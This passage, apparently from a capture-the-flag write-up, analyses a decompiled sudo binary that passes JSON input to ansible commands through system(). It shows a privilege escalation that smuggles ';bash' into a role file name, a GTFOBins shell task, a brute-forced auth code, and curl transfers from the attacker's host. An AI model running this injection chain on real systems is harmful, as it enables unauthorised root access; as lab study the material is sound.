          fwrite("Authentication key missing or invalid for \'run\' action.\n",1,0x38,stderr);
          json_decref(lVar2);
          return 1;
        }
        iVar1 = strcmp(pcVar5,"install");
        if (iVar1 == 0) {
          piVar3 = (int *)json_object_get(piVar3,"role_file");
          piVar4 = (int *)json_object_get(lVar2,"auth_code");
          if ((piVar4 != (int *)0x0) && (*piVar4 == 2)) {
            uVar6 = json_string_value(piVar4);
            iVar1 = check_auth(uVar6);
            if (iVar1 != 0) {
              if ((piVar3 == (int *)0x0) || (*piVar3 != 2)) {
                fwrite("Role File missing or invalid for \'install\' action.\n",1,0x33,stderr);
              }
              else {
                uVar6 = json_string_value(piVar3);
                installRole(uVar6);
              }
              goto LAB_00101db5;
            }
          }
          fwrite("Authentication key missing or invalid for \'install\' action.\n",1,0x3c,stderr) ;
          json_decref(lVar2);
          return 1;
        }
        fwrite("Invalid \'action\' value.\n",1,0x18,stderr);
      }
    }
  }
LAB_00101db5:
  json_decref(lVar2);
  return 0;
}
```

1. The **main** function takes two parameters: an integer **param_1** and an array of undefined size of type **undefined8**. It returns an integer.
2. The function first checks if the number of command-line arguments passed to the program is not equal to 2. If so, it prints a usage message and returns 1.
3. It then attempts to open a file specified by the second command-line argument (`param_2[1]`) in read mode. If the file cannot be opened, it prints an error message and returns 1.
4. Next, it attempts to parse the JSON data from the opened file using a function called `json_loadf`. If parsing fails, it prints an error message and returns 1.
5. The program then retrieves a key (`"run"`) from the parsed JSON data. If this key is missing or invalid, it prints an error message and returns 1.
6. If the key is valid, the program proceeds to check the value associated with the key `"action"`. If the action is `"list"`, it calls the function `listPlaybooks()`. If it's `"run"`, it further checks for an authentication code and proceeds to run a playbook based on the provided number. If it's `"install"`, it checks for a role file and installs the specified role.
7. After performing the necessary actions based on the JSON data, the program decrements the reference count of the JSON object and returns 0 if everything was successful.

### installRole class

![](https://miro.medium.com/v2/resize:fit:828/format:webp/1*Eb_kRdZ8R79x0NMjGY_LHQ.png)

1. The function takes one parameter, `param_1`, which presumably is the path to the tar archive file containing the Ansible role.
2. It first checks if the provided file is a valid tar archive by calling the `isTarArchive` function. If it returns 0 (indicating that the file is not a valid tar archive), the function prints an error message stating "Invalid tar archive" to the standard error stream ( ).
3. If the file is a valid tar archive, the function constructs a command string using `snprintf` to format the command. It combines the path to the `ansible-galaxy` executable (`/usr/bin/ansible-galaxy`) with the `"install"` action and the path to the tar archive file (`param_1`).
4. The constructed command string is then executed using the `system` function, which runs the command in the shell.

### runPlaybook class
![](https://miro.medium.com/v2/resize:fit:828/format:webp/1*ZmZXtRuUgev5t2s8f6aj-A.png)

1. It constructs a command string using `snprintf`. This command string combines the path to the `ansible-playbook` executable (`/usr/bin/ansible-playbook`), an inventory file (`/opt/playbooks/inventory.ini`), and the path to the playbook file (`/opt/playbooks/` concatenated with `param_1`).
2. The constructed command string is then executed using the `system` function, which runs the command in the shell.

### After analysis

This application processes a JSON file with two parameters: `role_file` and `auth_code`. It expects a top-level key `run`. If missing or invalid, it returns an error. Valid `run` keys trigger checks for associated `action` keys. If `list`, it lists playbooks; if `run`, it verifies an authentication code and executes a playbook; if `install`, it installs a specified role.

The `auth_code` parameter is obtained through brute-forcing earlier.

**1. First trying the list role with the auth code But unfortunately invain.**

```json
//list.json

{
  "run": {
    "action": "list",
    "auth_code": "UHI75GHINKOP",
  }
}
```

**2. Second option is to try run role, after some research I found this on [GTFOBins](https://gtfobins.github.io/)**

![](https://miro.medium.com/v2/resize:fit:828/format:webp/1*1huUcpPJiKyS6IYrYY_CSw.png)
_https://gtfobins.github.io/gtfobins/ansible-playbook/_

```json
//run.json

{
  "run": {
    "action": "run",
    "auth_code": "UHI75GHINKOP",
    "tasks": [
      {
        "shell": "/bin/bash </dev/tty >/dev/tty 2>/dev/tty"
      }
    ]
  }
}
```
Once again, our efforts did not yield the desired outcome.

The third option involves attempting to `install` a role. To do so, we utilize an archive template file containing the Ansible role. By installing the role, we aim to escalate our privileges and advance further in the system.

Let’s start researching for instructions on installing an Ansible administrator role from a tar file and the appropriate template file to use.

After conducting research, I came across a project from [Coopdevs Development](https://github.com/coopdevs/sys-admins-role/releases) that seems promising.

> Ansible role to create users for system administrators


1. First, download the project to your local machine, and then proceed to upload it to the Lopez machine.

    + download it to your local machine 
    ```bash 
    wget https://github.com/coopdevs/sys-admins-role/archive/v0.0.3.tar.gz
    ```
    + create a python server 
    ```bash 
    python3 -m http.server 8080
    ```
    + download it in lopez machine 
    ```bash 
    curl http://10.10.16.35:8080/v0.0.3.tar.gz -o sys-admins-role-0.0.3.tar.gz 
    ```

2. Rename the tar file to include “`;bash`” after the name, triggering the execution of a shell immediately after successfully installing the Ansible role, granting us a root access.

    ```bash
    mv sys-admins-role-0.0.3.tar.gz admin.tar.gz\;bash
    ```

3. Now write the JSON file to install the role and run the app

    ```json
    //root.json

    {
    "run": {
        "action":"install",
        "role_file":"admin.tar.gz;bash"
    },
    "auth_code":"UHI75GHINKOP"
    }
```
4. Execute the application, specifying the JSON file as input.

    ```bash
    sudo /opt/runner2/runner2 root.json 
    ```
    ![](https://miro.medium.com/v2/resize:fit:828/format:webp/1*YeDmnPV-GX9cWdjhDcIyow.png)
5. Finally, we have achieved root access. We can now obtain the root flag.